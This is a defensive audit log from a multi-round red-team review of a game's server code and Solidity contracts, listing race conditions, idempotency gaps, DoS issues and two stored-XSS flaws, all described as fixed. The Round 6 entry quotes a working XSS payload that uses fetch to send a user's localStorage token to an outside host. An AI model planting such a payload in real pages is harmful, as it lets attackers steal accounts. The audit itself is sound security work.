# AUDIT-redteam-loop.md — autonomous overnight red-team (rounds)

A founder-directed max-effort adversarial loop over the ENTIRE project (game modules + Solidity
contracts). Each round fans out finder agents across the codebase + independent skeptics that default to
REFUTING; survivors are triaged by the main loop, code bugs fixed with a regression each (§10.4 kept
exact), balance/design calls flagged not retuned (ground rule #1), `npm test` + `node tools/sim.js` kept
green, then committed.

---

## Round 1 — whole-project sweep (42 agents, 15 raw → 8 survived)

**No CRITICAL. No §10.4 drift.** 5 code fixes (regression each) + 1 balance flag; 2 accepted/known.

### Fixed in-commit

- **`chain.js:makeChainReader` — wrong-chain reclaim guard (was HIGH-claimed, MED).** `reclaimExpiredVouchers`
  runs OUTSIDE the worker's `assertChainId` gate, and `makeChainReader` built a `usedNonce` reader from
  `CHAIN_RPC_URL`+`VOUCHER_CLAIM_ADDRESS` with no chain-id assertion. On a CHAIN_ID/RPC drift to a chain Y
  with a same-address (colliding-deploy) VoucherClaim that answers `usedNonce=false` for a nonce genuinely
  claimed on chain X, reclaim would refund the burned $OMR (`+withdraw:omr`) — a chain-boundary
  double-spend the in-game ledger can't see (it nets to zero). **Fix:** `makeChainReader` now asserts
  `getChainId()===CHAIN_ID` before returning a reader; a mismatch (or an un-answerable getChainId) returns
  **null**, routing into reclaim's existing "no reader → skip, never refund blind" fail-safe. Dormant-safe
  (no CHAIN_ID in tests → guard skipped, reader null as before). Deploy-misconfig-triggered, not
  attacker-reachable, but a real value-safety gap matching the codebase's own "never refund blind" pattern.

- **`wire.js:sweepStandingWatches` — non-transactional $OMR burn (my step-five code; MED).** The standing-
  watch worker ran on bare `pool.query` autocommits, so its `SELECT omr … FOR UPDATE` lock was inert
  (dropped at statement end). Two gaps: (A) a §10.4 omr-bucket drift if the process died between the
  `omr = omr - cost` decrement and its `intel:watch` ledger row; (B) a same-account TOCTOU where a
  concurrent `withCharacter` $OMR spend commits between the affordability read and the decrement, driving
  omr negative. **Fix:** each renewal now runs in its own `pool.connect()+BEGIN/COMMIT` (the `sweepLoans`/
  `settlePassStipend` convention) — the `FOR UPDATE` lock persists across the affordability check and the
  decrement+ledger+tap-update commit/rollback together; a cheap unlocked pre-filter avoids opening a
  connection for comfortably-live taps, with the authoritative re-check inside the txn. Existing wire tests
  confirm behavior preserved.

- **`social.js:startSearch` — missing rat exception (LOW).** `fire`/`jump`/`npcHit`/`postBounty` all void
  family omertà for a rat, but `startSearch` didn't (it never fetched the rat flag), so a same-family
  hunter was blocked at the search — making the documented fire rat-waiver unreachable for them. **Fix:**
  `startSearch` now joins `account_persistent` for `rat` and excepts it, matching the siblings. Regression
  in `test/social.js` (a same-family rat is searchable; a loyal member isn't).

- **`economy.js:swap` (buy) + `business.js:launderAtBusiness` — missing jail gate (LOW).** Laundering
  (cash→$OMR, an extraction-prep act) was safehouse-gated but not jail-gated, unlike `deal`/`cook`/
  `boostCar`. A jailed (indicted/marked) player could keep washing toward extraction from a cell. §10.4
  unaffected (bounded by the wash caps). **Fix:** both now `throw 'jailed'`. Regression in `test/economy.js`.

- **`server.js:auth` — the §10.2 agent throttle skipped authed GETs (LOW).** The global limiter gated only
  POST/DELETE (`guarded`), so an agent could poll GET /v1/me — a `withCharacter` accrual + ledger-write
  path — at unlimited rate, defeating the 1/3s agent cadence. **Fix:** the route-level `auth` preHandler
  (which already queries the account for the ban check) now also fetches `agent_flag` (LEFT JOIN, no extra
  round-trip) and enforces the agent bucket on authed GETs; **humans are left unthrottled on GETs** so
  multi-tab console loads never 429. Regression in `test/security.js`.

### Flagged (not patched — ground rule #1)

- **`territory.js:raidRivalRacket` — over-cap emission (balance).** The clock-advance is emission-neutral
  only while the owner is below the 24h income cap; a raid on a NEGLECTED (over-cap) racket hands the owner
  fresh re-accruable headroom on top of the raider's cut, so total ledgered emission can reach ~1.3× the
  per-collect ceiling. §10.4 stays exact (all moves ledgered, gang-treasuries reconciles). Recorded in
  BALANCE.md; the dial is clamping `remainMs` to real elapsed-since-collect, or accept as intended.

### Accepted / known (no action)

- **`market.js:bidListing` AB-BA** — the previously-accepted, retry-masked cross-actor char-lock inversion
  (40P01 → clean `contention`, pre-commit abort, no §10.4 drift). One skeptic refuted it outright.

**Suite 33/33 + sim drift-0 after the batch.** `forge test` remains egress-blocked (the standing
pre-mainnet contract gate); the Solidity finder surfaced no reachable mint / replay / reentrancy / access
gap this round.

## Round 2 (in progress) — attack-class + per-contract deep dives (background finders)

- **Solidity contracts (all 6) — NO REAL FINDINGS.** VoucherClaim/OMR/GearVault/OMRStaking/OmertaFees/
  OmertaBond each hold no-mint / bounded-tranche / CEI-nonce-before-transfer / reentrancy-guard / access-
  control / staking pool-vs-principal separation. Two informational notes (not bugs, not patched):
  VoucherClaim.sweep lacks OmertaBond's on-chain over-sweep guard (owner-only; the off-chain full-reserve
  queue already bounds it — the accepted "Safe = root of trust" tranche model), and GearVault.minter is
  settable-by-design (the G-MED-1 fix relies on it; the "immutable" docstring is imprecise). `forge test`
  remains the pre-mainnet gate (egress-blocked here).
- **Estate/death completeness — COMPLETE, no value/ownership/escrow leak.** Every currency crossing death is
  ledgered; every dead-funded escrow (bounty/market/loan/boxing-bet/tourney/grand-prix/stakes/futurity)
  refunds/burns/carries and reconciles its §10.4 check; account-level survivors are account-keyed;
  resolve-snapshot tables correctly excluded. **Fixed (hygiene):** `daily_progress` (character-keyed,
  value-less daily-contract counters/claimed flags) was neither wiped nor account-level → orphan rows on
  death; added to the runEstate wipe list. No §10.4 surface (holds no value; heir gets a fresh id).
- **Escrow-identity integrity (all 10 checks) — CLEAN.** Bounty/market/loan/auction/poker-tourney/futurity/
  grand-prix/stakes/boxing-bet/convoy-insurance all reconcile under every interleaving traced (estate-burn
  vs expiry-sweep, claim-vs-burn, cancel-vs-sweep double-refund, multi-winner split leak) — each closed by
  shared-lock serialization + remainder-into-take. No stray cross-module escrow writer.
- **Two-party transfer rails — CLEAN.** Every settlement rail (bodyguard/round/buyout/standover/table/
  pvpDice/poker/bout/matchRace/challenge/pinkslip/repay/collect/buyPaper/fill/shakedown/inside-job/tribute/
  toll/family-contract) carves its take, uses sorted chars→accounts→leaves→singletons locks, reads consent
  from the locked limit row, and self-guards. The only untaxed path (loan-default disbursement) is the
  ALREADY-SIGNED-OFF collusion rail (one-shot per alt, MAX_ACTIVE=1, welsher+WANTED) — no new exposure.
- **persist-clobber + pg-mem INT-quirk (exhaustive mechanical sweep) — CLEAN.** The quirk was empirically
  pinned to `intcol = intcol − $param` only (163 arithmetic-UPDATE sites; 30 parameterized subtractions,
  all NUMERIC targets; INT columns only ever get addition/literal-`−1`) → zero vulnerable sites. No
  persist-clobber: every direct-SQL write to a persisted column runs in a worker/hand-rolled txn that never
  calls persist; every non-persisted in-memory field has a backing direct-SQL mirror.
- **Worker sweep races — value-moving sweeps SOUND** (per-item transactional, idempotent under a status
  lock, no worker AB-BA, no bare-pool value move besides the R1-fixed wire one). **Fixed (observability
  parity):** six cash-escrow resolvers (`sweepGrandPrix`, `sweepFuturity`, `sweepTournaments`,
  `sweepTrackEntries`, `sweepStakes`, `sweepMainEvents`) had a silent `catch { ROLLBACK }` — a persistently-
  throwing item would retry forever with frozen escrow and NO alarm (the §10.4 check reconciles as
  open==posted, "correctly stuck"). Added `console.error` poison-row logging (the `sweepAuctions`/
  `sweepUprisings` precedent) to all six + the three no-value NPC/raid sweeps for consistency.

**Round 2 verdict: no CRITICAL/HIGH/MED §10.4, lock, auth, or contract defect. 2 small correctness/hygiene
fixes (estate `daily_progress` wipe, worker poison-row logging). Suite 33/33 + sim drift-0.**

## Round 3 — rotated lenses (input-validation, status→power, RNG/determinism, accrual, gameplay-logic, cross-system)

- **Input-validation / type-coercion — CLEAN (1 defense-in-depth).** No route accepts a client-set price/
  amount into a ledger row unchecked; `Number.isFinite` guards front the money-moving numeric bodies
  (swap, bank, bids). **Hardened:** `vanity.js:spendOmr` — the single $OMR burn primitive — gained a
  `Number.isFinite(cost) && cost>0` guard so a future caller can never invert the burn into a mint (every
  caller passes a positive constant today; defense-in-depth on the chokepoint).
- **Status-axis → gameplay-power leakage — CLEAN (1 design note).** Hitman-rep / renown / notoriety /
  smuggler-legend / war-effort / boxing-legend / recruit-count are all read-only display axes; none feed a
  roll, price, or cap. Design note (intended, not patched): the Pen shot-caller is the most-feared inmate
  by `season_kills` — a status axis that grants a small cover bonus — but it's bounded (`FACTION_COVER_CAP`),
  a mark stays killable (`SHANK_MIN` floor), and it's the documented design.
- **RNG / determinism — 2 deploy-hardening fixes.** Every money roll is server-side + `rng_audit`'d; the
  §7.11 seed is the one secret. **Fixed:** production now refuses to boot on the unset/default `MARKET_SEED`
  (the seeded draws — Numbers 600:1, Track/Fight winners, goods prices — are client-predictable on the
  public default) and refuses if any test-only roll/timer override (`SHANK_P`, `LAW_BUST_P`, `SEARCH_MS`,
  `PORT_*`, `WORLD_*`, …) leaked into the prod env (both fail-OPEN misconfigs → the fail-closed JWT-guard
  posture). Regression in test/security.js.
- **Lazy accrual — SOUND (2 balance flags, not patched per ground rule #1).** The accrual engine clamps
  offline windows (income/exposure capped at the offline gap; heat/scrutiny bleed uncapped) and the heat
  meter clamps to 100 post-accrual. Flags for founder sign-off: (a) business/territory/crew "upkeep
  forgiveness" — a front unpaid past COLD stops earning but the arrears cap at 7d, so a long-absent owner's
  worst case is bounded (intended, documented); (b) speakeasy bar-take is collect-only income with the D2
  gate now enforced on upgrade too (see cross-system fix).
- **Gameplay-logic — 1 LOW fixed, 1 design note.** **Fixed:** five on-demand heat-add sites
  (fire/npcHit/world-raid×2/launder) added to `ch.heat` unclamped while their accrual siblings clamp at
  `Math.min(100,…)` — player-unfavorable + self-correcting, clamped for parity. Design note (intended):
  `jump` has no co-location gate (unlike fire's search-then-shoot) — jumping is a lighter, location-free
  mug by design.
- **Cross-system (background finder) — 1 MED fixed.** **D2 "shield, not bunker" bypass via the upgrade
  paths:** `collectBusiness`/`collectTerritory`/`collectSpeakeasy` all gate `safeHoused`, but the sibling
  `upgradeBusiness`/`upgradeRacket`/`upgradeSpeakeasy` bank the SAME pending income (business:income/
  territory:income/speakeasy:income) with no gate — a safehoused, untargetable player could realize
  operating income (the exact act D2 forbids) through the upgrade route, systemically across three systems.
  §10.4 stays exact (normal income faucet, 24h-capped → ~0 new value) but it cracks a SIGNED anti-abuse
  rule. Added `safeHoused` (throws `safe`) + jail parity to all three upgrades; regression in
  test/economy.js. Verified SAFE by the same finder: port contraband-loot × persist (no clobber, non-
  currency), GP/Stakes/Futurity/boxing-bet escrow × loot × death (debit-before-loot, all identities
  reconcile, resolve-snapshot tables excluded from the wipe), port piracy/rendezvous/collect concurrency
  (boat row FOR UPDATE serializes; piracy take is a <100% redirect → emission only falls), racer/car
  snapshots (never escrowed → move/consume can't dup), speakeasy standover/buyout (raid-first, no double-
  collect), and every account-level legend bump (direct-SQL, absent from persistAccount → no clobber,
  survives death).

**Round 3 verdict: no CRITICAL/HIGH. 1 MED (D2 upgrade-gate, signed-rule consistency), 1 LOW (heat clamp),
2 deploy-hardening (MARKET_SEED + test-knob boot guards), 1 defense-in-depth (spendOmr guard). 3 design
notes + 2 balance flags for founder sign-off. Suite 33/33 + sim drift-0.**

## Round 4 — six fresh lenses (HTTP idempotency/rate-limit, auth/session, chain reserve, casino den-book, referral anti-Sybil, market/loot escrow) + a manual gang-dissolution trace

**Verdict: no CRITICAL/HIGH. 4 real fixes (1 auth MED, 1 casino LOW-MED §10.4-adjacent, 1 idempotency MED,
1 idempotency LOW) + 1 defense-in-depth. The escrow/loot/chain/referral cores verified sound.**

### Fixed
- **Auth F1 (MED) — banned live sockets.** `/v1/ws` checked `banned` only at CONNECT; a mid-session ban
  left an open socket feeding streets/gang/me intel until the client disconnected, falsifying the
  documented "banned-WS close" guarantee (a banned scout feeding a gang live streets data). Added a
  per-account socket registry; `mod/ban` now closes every live socket (4003). Regression opens a live
  socket, bans, asserts it closes.
- **Casino F1 (LOW-MED) — den tip before payout booked.** The econ-pass tips the street/rakeback ONLY
  from realized profit; the deferred games insert the liability before tipping, but the two same-call
  games (dice, blackjack DEAL) tipped BEFORE booking the round's payout/liability → a winning round
  over-reported profit and minted a bounded ~1%-of-stake tip into `street_tax.pool` (the buyback loop,
  §10.4-invisible — the exact class the econ-pass closed). Reordered `takeHouse` to run after the
  payout/INSERT. Casino per-round house-book mirror updated to the corrected ordering.
- **Idempotency MED — proceed-unreserved on the release race.** On an INSERT PK-conflict, if the SELECT
  then found the row GONE (the holder's 4xx/5xx DELETEd its reservation — e.g. the `contention` error we
  tell clients to retry), the handler PROCEEDED WITHOUT re-reserving → onSend stored nothing → a retry
  re-executed = double bank/spend. Now loops and re-INSERTs so every proceeding request holds a
  reservation; refuses (409) on a pathological storm rather than run unprotected.
- **Idempotency finding-2 (LOW) — post-commit render releases the key.** `view()`/`coachOf()` runs after
  COMMIT; a throw (corrupt `onboard` column) surfaced a 500 → key DELETEd → retry re-executed the
  committed action. Guarded the render in both wrappers — degrade the snapshot to null, never the 2xx.
- **Referral L1 (defense-in-depth) — recruiter board agent exclusion made explicit.** `recruiterLeaderboard`
  relied solely on the "agents never bump `recruits`" invariant (boxing/port/races boards have an explicit
  `NOT agent_flag`); added the explicit predicate so a future `recruits` writer can't surface an agent.

### Verified CLEAN (not patched)
- **Chain reserve/withdrawal (afa8):** no CRIT/HIGH — nonce allocation single-threaded under
  `chain_reserve FOR UPDATE`, `committed ≤ funded` inductive, queued-cancel double/after-sign safe, the
  R3 reclaim no-reader-skip + `usedNonce` + grace + under-lock re-check holds, fees.js nonce-PK
  idempotency + Vig txHash-gate + atomic reconcile, §10.4 `withdraw:omr` exact in all four voucher
  states. 2 LOW flagged (drainQueue has no standalone trigger — liveness; `mod/reserve/claimed` has no
  on-chain verify — mod-trust).
- **Market/auction escrow + P1.1 loot (a067):** no defects — market/auction/order escrow identities
  reconcile, the audited kind-guard holds, loot legs are §10.4-exact and clobber-safe, death paths clean.
  1 accepted item (auction $OMR bid loot-shelter — §10.4-clean loot-avoidance, self-limiting, the prior
  AUCTION-audit F3 sign-off lever).
- **Referral/growth (aa56):** no CRIT/HIGH/MED, §10.4 clean — spark/qualify/tier-2/mission latches all
  atomic once-ever, post-commit hooks wrapped, agents excluded at every tier-2 level, tier-2 is
  CASH/DEPTH-2/middle-link-qualified, push can't mint $OMR. LOW flags: tier-2 missed-fire no-retry
  (payout-loss edge), social trust-mode faucet (founder sign-off, run `live`).
- **Gang dissolution (manual):** no §10.4 orphan — treasury/omr_reserve/ammo_bank all burn `gang:dissolved`
  (no gang `cb` bucket exists), territory/frontier/districts/wars/commission-votes/portfolio all
  released/deleted, and a dissolved gang's live bounty-escrow contribution correctly BURNS (`death:bounty`
  via refundPot's deleted-gang branch) when the pot resolves — the escrow check stays balanced meanwhile.
- **Auth (a795):** verifyX default-off confused-deputy stopgap, Privy ES256+JWKS+aud(scalar|array)+exp
  hardened, guest→provider UNIQUE-guarded, agent-flag DB-sourced, SIWE replay/uniqueness closed. LOW:
  invite double-spend under concurrent first-login (budget waste, no boundary breach). INFO: Privy `iss`
  conditional (mitigated by JWKS+aud).
- **HTTP layer (adf4):** the reserve-before-execute concurrent core is sound (409 on the loser,
  char-lock serialization); replay is 2xx-only + body-bound; agent throttle DB-sourced + GET-throttled;
  swap/launder share the bucket; per-IP auth throttle trustProxy-off. LOW deploy notes: AGENT/SWAP rates
  are import-time constants (fail-secure); in-memory buckets multiply across workers without REDIS_URL;
  a crash between COMMIT and onSend leaves a status=0 row that 409s until the 24h prune (self-heals).

**Round 4 verdict: 4 fixes + 1 hardening, all committed green (suite 33/33 + sim drift-0). The chain,
escrow, loot, referral, and gang-dissolution cores are sound; residual items are LOW/deploy-config/
founder-sign-off (drainQueue liveness, mod-trust claimed, invite budget, social trust-mode, auction
loot-shelter, tier-2 missed-fire).**

## Round 5 — six deep economic lenses (kitchen, Law/RICO, territory/frontier emission, backed-$OMR flywheel, status-modifier composition, co-op crew) + a manual route-wrapper sweep

**Verdict: NO CRITICAL/HIGH/MED across all six lenses. The economy cores are sound.** Only code changes: 2
cosmetic display fixes (view cargoCap/skillPoints). Everything else is founder-sign-off / design-call.

### Fixed
- **Status-modifier cosmetics (2 display bugs).** The character view under-reported `cargoCap` (omitted the
  `road_boss` capstone's +trunk — a maxed Wheelman shown a smaller trunk than `trunkCap()` enforces) and
  `skillPoints` (omitted the prestige bonus `pointsOf()` grants). Display-only — enforcement was already
  correct — the view now mirrors the canonical helpers exactly.

### Verified CLEAN (no patch)
- **Vig / backed-$OMR flywheel (ad20) — the critical one.** No $OMR mint beyond backing exists: staking
  rewards, dividends (personal + family pools, kept separate), and the pass stipend are all pool-bounded
  TRANSFERS (in `omrBuckets`, in neither the mint nor burn term); `prize:omr` is the SOLE in-game mint,
  1:1 backed by real-revenue-bought hard $OMR moved pool→reserve. `runVigInvariants` (spend≤revenue,
  split-exact, reserve-fully-backed, extraction≤reserve) holds by construction; the fabricated-`vig_revenue`
  surface is closed by the `txHash`/`ALLOW_MOD_REAL_REVENUE` gate; PLEX burns (never mints); the AMM LP
  carve pairs event-fund $OMR (mints nothing). Extraction ≤ inflow holds.
- **Kitchen/drug economy (a17c).** Every cook/collect/deal/crew-sale ledgered + reconciles §10.4 check (a);
  the on-ramp +50% phases out exactly at trade-rank 1 (signed curve untouched); the crew-cold gate closes
  the offline-sale dodge; the Bureau raid seizes without double-count; cook/collect is race-safe; the
  victim's post-accrual stash decrement persists (no re-sale exploit). 2 by-design balance notes (hire
  defers the nut, bounded; 3-day cold-grace).
- **Law/RICO courtroom (a2ba).** Forfeiture reconciles the per-character cash check exactly (pocket-then-
  bank, floored, staked-$OMR/gear safe, NOT death); the conviction floor (0.045) forbids a minted
  acquittal; the informant collapse/meter/sweep are single-resolution + bounded (GREATEST/floor); rat/
  wanted omertà scoping is consistent across every kill site. 2 sign-off (demandTrial cheap reset,
  foundation `joined_at` fail-open on legacy NULL — deploy migration note).
- **Territory/frontier/occupation (a77f).** The emission-neutral clock-advance is provably `cut+residual ≤
  pending` (deflationary); the gang-treasuries §10.4 check categorizes every reason correctly; seizure/
  invade/liberation never double-credit; the NPC-raid rout bonus fires only on the floor-crossing. Design
  flags (§10.4-safe): a rival can muscle a COLD op the owner can't collect; rising-vassal tribute is a
  capped deferral vs the board's "pays no tribute" copy.
- **Co-op crew (heist/convoy/port) (aa2c).** Pot splits floored ≤ pot (no mint); the rat is a net sink
  (ring −EV); insurance underwriting cap makes a colluding ring's net extraction ≤0 by construction;
  degrading multi-ambush wears only on a WIN; the toll/port faucets are supply-cap/regen bounded; piracy
  is a <100% redirect (emission only falls); goods conserve by count; every direct-SQL column
  (contraband/port_used/berths) is confirmed OUT of the persist positional UPDATE (no clobber); the lock
  order is acyclic. Design flags: inside-job can rob a COLD front's pending (CONSISTENT with shakedown —
  neither PvP path gates cold, a "neglected front is vulnerable" design call, §10.4-clean); warehouse→fence
  ≤1.25× variance faucet (BALANCE.md); joiner-rat individually +EV (intended betrayal, ring −EV).
- **Manual route-wrapper sweep.** Every inline `pool.query` mutation in server.js is legit infrastructure
  (idempotency store, account/character creation, agent-flag, notifications-deliver, ban/invite) — NO
  player economic route bypasses the withCharacter/withTwoCharacters ledger+lock discipline. Character
  creation sets genesis state (server-authoritative rollStats), not a §10.4 transfer.

### Founder sign-off items surfaced (NOT bugs, ranked)
Status-modifier WATCH: (W1) skills melt (fence_network×kingpin ×1.1664) cheapens the melt→ammo faucet —
the D1 kill-EV anchor the Underworld deliberately won't touch, now indirectly moved by Skills (emission-
bounded, a `FENCE_MULT` lever); (W2) a grandmaster active clears `world_raid_at` (2h < the 4h active CD) →
~+50% solo tap-rate on non-apex outfits (emission-neutral, but a status modifier reaching a signed cash-
faucet's pacing). Plus the territory cold-muscle / inside-job-cold design call, demandTrial reset, and the
kitchen ramp-phase notes. All §10.4-clean.

**Round 5 verdict: 2 cosmetic fixes; the Vig backing wall, kitchen faucets, law forfeiture, territory
emission, co-op payouts, and the route-wrapper discipline are all sound. Suite 33/33 + sim drift-0.**

## Loop summary (Rounds 1–5)
Five rounds, ~30 finder agents + manual traces. **No CRITICAL, no HIGH exploitable-by-a-player defect, no
§10.4 conservation breach anywhere.** Fixes shipped: R1 (5 + a balance flag), R2 (2 hygiene/observability),
R3 (D2 upgrade-gate, heat clamp, RNG deploy guards, spendOmr guard), R4 (banned-WS live close, casino
tip-after-payout, idempotency re-reserve + post-commit render guard, recruiter agent exclusion), R5 (2 view
display fixes). The recurring theme: real but bounded defects — signed-rule consistency cracks, intra-call
ordering, idempotency-retry seams, and display drift — never a value-minting or conservation hole. The
backed-$OMR flywheel, escrow identities, chain reserve, loot legs, auth boundary, and lock order are the
load-bearing surfaces and all verified sound. Residuals are LOW / deploy-config / founder-sign-off, tracked
above and in BALANCE.md.

## Round 6 — four safety-critical lenses (death/PvP concurrency, competitive escrows, worker orchestration, client/public-route injection) + a manual estate-wipe completeness sweep

**Verdict: 1 HIGH (stored XSS) + 2 MED (worker monitoring) fixed. The death/PvP chain, all competitive
escrows, and the estate wipe verified sound.** This round surfaced the loop's most serious finding.

### Fixed
- **Stored XSS → account takeover (HIGH).** Player display strings (character/gang name, custom title,
  140-char contract reason, estate name) had NO server-side charset filter, the console renders them raw
  into innerHTML (no escape helper — `esc` was undefined), and the bearer token lives in localStorage. A
  name/reason like `<img onerror=fetch('//e/'+localStorage.omerta_token)>` executes when a victim views
  the contract board / streets roster → token exfiltration → cross-user account theft. Fixed at the DATA
  LAYER (shared `cleanText()` strips `< > " ` + control chars from all six write sites; legit punctuation
  survives) + client-side `esc()` defense-in-depth (also fixes a pre-existing broken `esc()` reference
  that threw). Fighter/racer/speakeasy/dynasty names already used the safe `/^[\w .,'&-]+$/` charset. The
  broadcast/public cards.js was already clean. Regression in test/security.js.
- **Worker A — real-value invariants now alarm nightly (MED→HIGH on chain go-live).** The nightly monitor
  ran only `runLedgerInvariants`; the Vig (extraction≤reserve, reserve-backed) + Bond (anti-Ponzi) walls
  were mod-route-only and self-alerted nowhere → a live unbacked reserve would drift SILENTLY. Now run
  nightly + routed through the same `alertDrift` (kind-tagged; ledger keeps its original event name).
- **Worker B — the ledger monitor is now a consistent snapshot (MED).** ~40 independent reads had no
  snapshot, so a player commit between two halves of a check tore the read into FALSE drift → a false
  webhook alarm at the non-technical founder. Now wrapped in one REPEATABLE READ / READ ONLY transaction
  (clean pg-mem fallback). No check logic changed.

### Verified CLEAN (not patched)
- **Death/PvP concurrency (a519):** no CRIT/HIGH/MED — the victim `FOR UPDATE alive` load + in-memory
  `alive=false` persist-skip (no cash resurrection), account-lock-serialized shield/loot ordering
  (bodyguard→respawn, one absorb), all-pots-pre-locked bounty-on-death, `killerCh` in-memory loot
  threading, single-`WHERE id IN` war-score (no AB-BA), and fresh-heir state all hold under adversarial
  interleaving. One benign LOW (a `bodyguardAbsorbs` guard-death TOCTOU — a just-killed guard absorbs the
  bullet in a sub-ms window; no §10.4, no resurrection, defender-favoring) — flagged.
- **Competitive escrows (a4b5):** no CRIT/HIGH — every escrow identity (boxing main-event / poker tourney
  / grand-prix / stakes / futurity) drains to 0 on every terminal state; the parimutuels never touch the
  PvE den book (reason-prefix isolation); state-before-row lock order consistent; worker resolvers
  idempotent single-writers; the two-party instant games are the audited casino:pvp taxed transfer;
  belt/callout/legend under death sound; frozen-form snapshots resolve even if the racer is bred/sold.
  Two LOW (retry-masked boxing resolve-vs-cancel AB-BA; standover forfeits the owner's pending bar take)
  — flagged.
- **Worker orchestration (a1c2):** buyback conservation exact + lock order + idempotency, season rollover
  snapshot-before-reset + under-winner-lock grant + idempotent, `safe()` per-job isolation, assertChainId
  fail-closed, reclaim no-double-spend — all sound. Two LOW flagged (no `statement_timeout`; season
  rollover is one monolithic txn — liveness, not §10.4).
- **Estate-wipe completeness (manual):** every character-keyed table is wiped (loop + direct DELETEs +
  dedicated `wipeFighterAtDeath`/`wipeSpeakeasyAtDeath`/`cancelMainEventsAtDeath`/convoys-`lost`), an
  intentional account survivor (`account_persistent`/`rng_audit`/`transactions`), or an intentional
  resolve-snapshot (`*_entries`/`futurity_runners`/`track_entries`). The two un-wiped (`notifications`,
  `missions_done`) are harmless cruft — never re-read (fresh heir id) and the reward is account-gated. No
  orphan/inheritance bug.
- **Route-wrapper discipline (manual):** no player economic route bypasses withCharacter/withTwoCharacters.

**Round 6 verdict: 3 fixes (1 HIGH XSS + 2 MED monitoring). The death/PvP + escrow + estate cores are
sound. Residual LOWs are benign/design/deploy-config. Suite green + sim drift-0.**

## Round 7 — three fresh high-value lenses (cross-system exploit chains, resource-exhaustion/DoS, admin-ops + MCP-agent surface)

**Verdict: 1 HIGH (mod-side stored XSS → root) + 3 MED (DoS) fixed. The cross-system §10.4 boundary — the
load-bearing surface — verified CLEAN end-to-end.**

### Fixed
- **Mod-side stored XSS → mod-key root escalation (HIGH).** `claimSocial` stored player free-text `proof`
  into telemetry un-sanitized; `admin.html`'s activity feed rendered it into innerHTML with no escaping,
  while the mod key lives in sessionStorage on that origin. A player's crafted proof executes when a mod
  opens `/admin` → mod-key theft → root `/v1/mod/*`. Fixed both layers (`cleanText` at source + `esc()` in
  admin.html on the feed + top-players). The same finder verified CLEAN: the mod-key perimeter
  (timingSafeEqual, no dev fallback), input validation (confiscate `[0,pocket]` clamp), comp/revenue
  txHash-gating (a comp injects zero backed value), the OpenAPI mod-exclusion, admin CSRF (custom-header
  bearer, not cookie), the MCP `omerta_request` (never forwards `x-mod-key` → agent can't reach mod), and
  signer-PK/PII non-leakage.
- **Resource-exhaustion / DoS (3× MED, read-only — no §10.4 hole).** (1) `agentLeaderboard` seq-scanned the
  append-only ledger (`reason`-only predicate) → scoped to the top-25 + `currency='omr'` (uses the index).
  (2) The keyless card/profile routes resolved names via case-insensitive `lower(name)` with only a
  case-sensitive index → seq-scan per unauthenticated hit → added a `lower(name)` functional index. (3) WS
  sockets were uncapped per account (each an O(N) streets fan-out) → capped at 8. Verified bounded: 1 MB
  body limit, PNG cache (256+TTL), 48-char name clamp, mod-gated ops scans, worker anti-amplification.
  Flagged for deploy (CDN/per-IP throttle on the keyless unfurl routes — a code throttle would break legit
  crawler volume).

### Verified CLEAN (not patched)
- **Cross-system exploit chains (ad0f) — the headline.** No CRIT/HIGH/MED. Every seam traced end-to-end:
  status↔currency laundering (invest/dividend split are exact transfers; free `grantShares` earn no
  dividend; personal & family pools separate), escrow↔escrow (each identity sums its own table on
  exact-reason matches; the one shared `bounty:refund` correctly split by `character_id IS NULL`; the
  wanted-HOUSE refund uses a distinct reason), gang-treasury round-trips (tribute/contract/territory/world/
  toll all reconcile in check (b); rival-raid clock-advance emission-neutral), death-as-laundering (exact
  cash+bank burn, loot carve-outs reduce the estate burn 1:1, debt-survives-to-heir §10.4-neutral),
  ownership-flag survival (race/pledge flags cleared on every transfer), and the backed-$OMR flywheel
  (both prize-pool consumers fundReserve; extraction≤inflow holds). No hidden mint in the entire $OMR
  vocabulary. Three re-confirmed accepted items (shared dividend-pool allocation, auction $OMR loot-shelter,
  contraband stranding) — all §10.4-clean founder dials.

**Round 7 verdict: 4 fixes (1 HIGH XSS + 3 MED DoS). The cross-system value boundary is sound. Suite green
+ sim drift-0.**

## Loop summary (Rounds 1–7, FINAL)
Seven rounds, ~40 finder agents + manual traces, every fix committed + pushed (suite green + sim drift-0
throughout). **No CRITICAL. No §10.4 conservation breach anywhere in seven rounds.** Two HIGH found, both
in the client/mod injection surface (the one surface no prior AUDIT-*.md had swept), both closed at the
data layer + client:
- **R6 HIGH:** stored XSS in the player console (name/reason/title → token theft).
- **R7 HIGH:** stored XSS in the mod dashboard (social-task proof → mod-key root escalation).
Everything economic — the backed-$OMR flywheel, all escrow identities, the cross-system §10.4 boundary,
chain reserve accounting, loot legs, death/PvP concurrency, the kitchen/law/territory/casino faucets, and
the lock order — was probed by dedicated lenses and verified sound. The 20-odd fixes shipped were: two
stored-XSS HIGHs, a set of MED consistency/monitoring/DoS hardenings (D2 upgrade-gate, banned-WS live
close, idempotency re-reserve, casino tip-after-payout, worker real-value alarms + snapshot monitor,
WS/ledger-scan DoS), RNG deploy guards, and cosmetic display fixes — never a value-minting or
conservation hole. Residual items are LOW / deploy-config / founder-sign-off, catalogued above and in
BALANCE.md. **The injection surface (both HIGHs) is the one place the codebase was genuinely exposed;
it is now closed. The economic core was already sound and stayed sound.**
